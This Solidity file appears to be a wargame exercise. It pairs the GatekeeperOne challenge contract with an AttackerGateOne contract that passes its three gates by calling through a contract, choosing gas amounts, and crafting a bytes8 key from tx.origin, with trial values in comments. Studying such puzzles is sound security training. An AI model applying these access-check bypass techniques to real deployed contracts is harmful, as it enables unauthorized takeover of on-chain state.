// SPDX-Licence-Identifeir: MIT

pragma solidity ^0.8.0;

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin, "Gate one: Tx originnnnnnnnnnnnnnnnn");
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0, "Gate two: gas leftttttttttttttttttt");
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(
            uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)),
            "GatekeeperOne: invalid gateThree part one"
        );
        require(
            uint32(uint64(_gateKey)) != uint64(_gateKey),
            "GatekeeperOne: invalid gateThree part two"
        );
        require(
            uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)),
            "GatekeeperOne: invalid gateThree part three"
        );
        _;
    }

    function enter(
        bytes8 _gateKey
    ) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

contract AttackerGateOne {
    GatekeeperOne public gate;

    constructor(address _gate) {
        gate = GatekeeperOne(_gate);
    }

    function attackGate(uint256 _gas, bytes8 _gateKey) public {
        //2266, 7030, 0x1000000000002266, 0x1000000000007030
        gate.enter{gas: _gas}(_gateKey); // 41381, 426, 41376
    }

    function gate1(bytes8 _gateKey) public pure returns (uint32, uint16) {
        return (uint32(uint64(_gateKey)), uint16(uint64(_gateKey)));
    }

    function gate2(bytes8 _gateKey) public pure returns (uint32, uint64) {
        return (uint32(uint64(_gateKey)), uint64(_gateKey));
    }

    function gate3(bytes8 _gateKey) public view returns (uint32, uint16) {
        return (uint32(uint64(_gateKey)), uint16(uint160(tx.origin)));
    }
}